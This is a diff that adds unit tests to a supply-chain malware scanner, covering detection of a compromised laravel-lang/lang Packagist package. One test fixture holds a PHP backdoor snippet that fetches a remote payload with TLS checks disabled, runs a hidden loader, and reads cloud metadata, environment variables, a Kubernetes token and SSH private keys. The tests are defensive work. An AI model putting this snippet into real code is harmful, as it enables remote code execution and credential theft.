@@ -684,7 +684,7 @@ name = "normalpkg"
     def test_live_adapter_version_rows_for_new_ecosystems(self):
         fixtures = {
             "crates": ({"versions": [{"num": "1.0.0", "created_at": "2026-01-01T00:00:00Z"}]}, "fixture", "1.0.0"),
-            "packagist": ({"packages": {"vendor/fixture": [{"version": "1.0.0", "time": "2026-01-01T00:00:00Z", "dist": {"url": "https://example.test/fixture.zip"}}]}}, "vendor/fixture", "1.0.0"),
+            "packagist": ({"packages": {"vendor/fixture": [{"version": "1.0.0", "time": "2026-01-01T00:00:00Z", "dist": {"url": "https://example.test/fixture.zip", "reference": "dist-sha"}, "source": {"url": "https://github.com/vendor/fixture.git", "reference": "source-sha"}}]}}, "vendor/fixture", "1.0.0"),
             "go": ({"versions": [{"version": "v1.0.0", "published_at": "2026-01-01T00:00:00Z"}]}, "github.com/example/fixture", "v1.0.0"),
             "huggingface": ({"sha": "main", "lastModified": "2026-01-01T00:00:00Z", "siblings": [{"rfilename": "config.json"}]}, "secopsai/fixture-model", "main"),
             "maven": ({"versions": [{"version": "1.0.0", "published_at": None}]}, "com.example:fixture", "1.0.0"),
@@ -696,6 +696,9 @@ name = "normalpkg"
             rows = supply_chain._version_rows_from_metadata(ecosystem, supply_chain.normalize_package_name(ecosystem, package), metadata)
             self.assertTrue(any(row["version"] == version for row in rows), ecosystem)
             self.assertTrue(any(row.get("artifact_url") for row in rows), ecosystem)
+            if ecosystem == "packagist":
+                self.assertEqual(rows[0]["source_reference"], "source-sha")
+                self.assertEqual(rows[0]["dist_reference"], "dist-sha")
 
     def test_local_chrome_artifact_scan_uses_deterministic_rules(self):
         with tempfile.TemporaryDirectory() as temp_dir:
@@ -760,6 +763,78 @@ name = "normalpkg"
         self.assertEqual(payload["result"]["old_version"], "1.0.0")
         self.assertIn(payload["result"]["verdict"], {"malicious", "benign"})
         self.assertEqual(payload["result"]["metadata"]["artifact_status"], "downloaded")
+
+    def test_packagist_source_detection_flags_metadata_tag_and_artifact_backdoor(self):
+        metadata = {
+            "packages": {
+                "laravel-lang/lang": [
+                    {
+                        "version": f"14.3.{index}",
+                        "time": "2026-05-18T10:00:00Z",
+                        "dist": {"url": f"https://api.github.com/repos/Laravel-Lang/lang/zipball/new-{index}", "reference": f"new-{index}"},
+                        "source": {"url": "https://github.com/Laravel-Lang/lang.git", "reference": f"new-{index}"},
+                    }
+                    for index in range(12)
+                ]
+            }
+        }
+        previous_snapshot = {
+            "versions": [
+                {"version": "14.3.7", "source_reference": "clean-sha", "dist_reference": "clean-dist"}
+            ]
+        }
+        current_tags = [
+            {"tag": "v14.3.7", "sha": "malicious-sha", "tagger_date": "2026-05-18T10:00:00Z", "reachable": False},
+            {"tag": "v14.3.8", "sha": "other-sha", "tagger_date": "2026-05-18T10:01:00Z", "source_repo": "attacker/lang"},
+        ]
+        previous_tags = [{"tag": "v14.3.7", "sha": "clean-sha", "tagger_date": "2026-04-01T00:00:00Z"}]
+        files = {
+            "composer.json": json.dumps({"autoload": {"files": ["src/helpers.php"]}}),
+            "src/helpers.php": (
+                "<?php /* fixture only */ "
+                "$ctx=stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]); "
+                "$payload=file_get_contents('https://flipboxstudio.info/payload.php', false, $ctx); "
+                "exec('php /tmp/.laravel_locale/loader.php &'); "
+                "file_get_contents('http://169.254.169.254/latest/meta-data/'); "
+                "file_get_contents('/proc/self/environ'); "
+                "file_get_contents('/var/run/secrets/kubernetes.io/serviceaccount/token'); "
+                "file_get_contents(getenv('HOME').'/.ssh/id_rsa');"
+            ),
+        }
+
+        payload = supply_chain.analyze_packagist_source_package(
+            "laravel-lang/lang",
+            metadata=metadata,
+            previous_snapshot=previous_snapshot,
+            current_tags=current_tags,
+            previous_tags=previous_tags,
+            files=files,
+        )
+        signal_ids = {signal["rule_id"] for signal in payload["metadata_evidence"]["signals"] + payload["tag_evidence"]["signals"]}
+        findings = "\n".join(payload["artifact_evidence"]["findings"]).lower()
+        self.assertIn("PACKAGIST-MASS-VERSION-UPDATE", signal_ids)
+        self.assertIn("PACKAGIST-HISTORICAL-SOURCE-REF-CHANGED", signal_ids)
+        self.assertIn("GITHUB-TAG-REWRITTEN", signal_ids)
+        self.assertIn("GITHUB-TAG-UNREACHABLE-COMMIT", signal_ids)
+        self.assertIn("composer autoload.files", findings)
+        self.assertIn("credential file discovery", findings)
+        self.assertIn("flipboxstudio.info", payload["iocs"]["domains"])
+        self.assertEqual(payload["verdict"], "malicious")
+
+    def test_packagist_namespace_watch_expands_packages(self):
+        metadata = {
+            "packages": {
+                "laravel-lang/lang": [
+                    {"version": "14.3.7", "time": "2026-05-18T10:00:00Z", "dist": {"url": "https://example.test/lang.zip"}}
+                ]
+            }
+        }
+        with mock.patch.object(supply_chain, "_fetch_packagist_namespace_packages", return_value=["laravel-lang/lang"]), \
+             mock.patch.object(supply_chain, "_fetch_ecosystem_metadata", return_value=metadata), \
+             mock.patch.object(supply_chain, "_scan_release", return_value=supply_chain.ScanResult("packagist", "laravel-lang/lang", None, "14.3.7", "benign", "", None, None, None)):
+            payload = supply_chain.watch_packagist_namespace(namespace="laravel-lang", since="7d", dry_run=True, limit=5)
+        self.assertEqual(payload["packages"], ["laravel-lang/lang"])
+        self.assertEqual(payload["total_scanned"], 1)
 
     def test_ecosystem_rules_detect_first_pass_risks(self):
         cases = {
@@ -1344,10 +1419,46 @@ const https = require("https");
         durabletask = supply_chain.check_advisory("pypi", "durabletask", "1.4.2")
         nx_console = supply_chain.check_advisory("open-vsx", "nrwl.angular-console", "18.95.0")
         grafana = supply_chain.check_advisory("github", "grafana/grafana", "2026-05")
+        laravel_lang = supply_chain.check_advisory("packagist", "laravel-lang/lang", "14.3.7")
         self.assertTrue(durabletask["matched"])
         self.assertTrue(nx_console["matched"])
         self.assertTrue(grafana["matched"])
+        self.assertTrue(laravel_lang["matched"])
         self.assertEqual(nx_console["matches"][0]["safe_versions"], ["18.100.0"])
+
+    def test_composer_lock_usage_reports_installed_packagist_version(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            lockfile = Path(temp_dir) / "composer.lock"
+            lockfile.write_text(json.dumps({
+                "packages": [
+                    {
+                        "name": "laravel-lang/lang",
+                        "version": "14.3.7",
+                        "source": {"url": "https://github.com/Laravel-Lang/lang.git", "reference": "malicious-sha"},
+                        "dist": {"reference": "malicious-dist"},
+                        "time": "2026-05-18T10:00:00Z",
+                    }
+                ]
+            }), encoding="utf-8")
+            payload = supply_chain.find_composer_lock_usage(temp_dir, "laravel-lang/lang")
+        self.assertTrue(payload["present"])
+        self.assertEqual(payload["matches"][0]["version"], "14.3.7")
+        self.assertEqual(payload["matches"][0]["source_reference"], "malicious-sha")
+
+    def test_laravel_lang_discovery_terms_are_supply_chain_relevant(self):
+        item = {
+            "title": "Laravel Lang Compromised with RCE Backdoor Across 700+ Versions",
+            "summary": "Composer autoload.files backdoor and historical tag rewrite across PHP package releases.",
+            "url": "https://socket.dev/blog/laravel-lang-compromise",
+        }
+        self.assertTrue(supply_chain._is_campaign_relevant(item))
+        payload = supply_chain.campaign_intake(
+            text="laravel-lang/lang Composer package tag rewrite autoload.files RCE backdoor credential stealer flipboxstudio.info",
+            source_name="Source fixture",
+            source_url="https://packagist.org/packages/laravel-lang/lang",
+        )
+        self.assertEqual(payload["orchestrator"]["recommended_route"], "campaign_research")
+        self.assertNotIn("autoload.files", supply_chain._flatten_iocs(payload["campaign"]["iocs"]))
 
     def test_campaign_watchlist_add_and_list_uses_runtime_path(self):
         with tempfile.TemporaryDirectory() as temp_dir:
